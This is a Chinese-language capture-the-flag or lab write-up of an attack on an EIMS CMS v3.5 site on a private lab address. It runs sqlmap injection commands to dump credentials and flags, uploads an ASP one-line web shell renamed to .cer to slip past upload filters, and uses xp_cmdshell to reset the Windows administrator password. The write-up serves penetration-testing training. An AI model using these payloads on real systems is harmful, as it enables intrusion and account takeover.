# CRC_3_PENTEST_7_EIMS综合渗透

1.刚开启一个视频网站，大量资源流出损失很大。对黑客这种恶劣行为你励志找到这个可恶的黑客和这个系统的漏洞。

## 1.访问站站点

通过对网站访问发现此网站为`Powered By [eims_cms](http://eims.org.cn/) V 3.5`

![1568170770121](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568170770121.png)

发现此版本的cms存在sql注入的漏洞。

## 2.利用漏洞进行sql注入

发现存在漏洞的点在：`http://192.168.200.109/Notice.asp?ItemID=18`

这时使用sqlmap对其进行自动注入。

![1568170829967](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568170829967.png)

01.使用sqlmap对数据库进行暴力破解，获取数据库名、表名、字段名，最终获取后台管理员账号及密码。

sqlmap基础用法：

./sqlmap.py -u “注入地址” -v 1 --dbs // 列举数据库

./sqlmap.py -u “注入地址” -v 1 –current-db // 当前数据库

./sqlmap.py -u “注入地址” -v 1 –users // 列数据库用户

./sqlmap.py -u “注入地址” -v 1 –current-user // 当前用户

./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库” // 列举数据库的表名

./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库” // 获取表的 列名

./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库” // 获取表中的数据，包含列



02.通过在数据库下发现eims_flag 查看字段内容发现其中的flag信息。

`sqlmap.py -u http://192.168.200.109/Notice.asp?ItemID=18 -D Test_EIMS -T eims_flag -C flag --dump`

![1568165116326](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568165116326.png)

03.然后继续查找数据库eims_User 中的账号信息。

`sqlmap.py -u http://192.168.200.109/Notice.asp?ItemID=18 -D Test_EIMS -T eims_User -C Item1,Item2,Item3,Item4,Item5,Item6,Item7,Item8,Item9 --dump`

![1568164592100](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568164592100.png)

发现账号为：root 密码为 b2076528346216b3 采用md5加密，通过解码发现其密码为：admin1234

## 3 后台登录地址查找

01.通过御剑后台扫描器找到网站的后台地址

![1568165179355](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568165179355.png)

02.这时候要主要，打开后台页面的源码观察是否存在flag

![1568165337389](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568165337389.png)

发现其第二个flag

## 4.登录后台

![1568165627120](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568165627120.png)

01.这时候开始寻找后台的上传点，并且构造相应的asp的一句话进行上传，

asp一句话为：`<%eval request("cmd")%>` 为了让一句话木马更具有迷惑性需要把文件后缀改为.cer

02.上传文件

选择好文件开始上传

![1568165875202](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568165875202.png)

03.连接一句话

这时候获取到对应的路径地址，在ip地址后加入对应的地址对一句话木马进行测试，这时候可以采用蚁剑或菜刀进行连接。

`http://192.168.200.109/Upload/DownFiles/2019091102085188.cer`

![1568166135204](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568166135204.png)

![1568166173496](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568166173496.png)

04.观察网站的根目录会发现存在一个flag.asp 的文件 打开会发现对应的flag

![1568166254862](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568166254862.png)

05.在数据库配置文件中找到数据库的账号密码

![1568166437240](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568166437240.png)

## 4.使用一句话木马连接mssql数据库

![1568166719033](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568166719033.png)

利用mssql数据库的xpcmdshell组件执行系统命令:

01.EXEC master..xp_cmdshell 'whoami'     //查看当前我们的用户权限

![1568166788895](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568166788895.png)

当前cmdshell的权限是system权限，所以直接修改administrator的密码为1ue.com

02.EXEC master..xp_cmdshell 'net user administrator 1ue.com'

![1568166829976](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568166829976.png)

这时候系统的命令已经被更改开始使用远程连接服务器

## 5..直接远程桌面连接服务器

01.在桌面发现flag文件

flag5{}

![1568166936254](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568166936254.png)

02.在c盘发现另外一个flag文件

flag4{}

![1568166969530](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568166969530.png)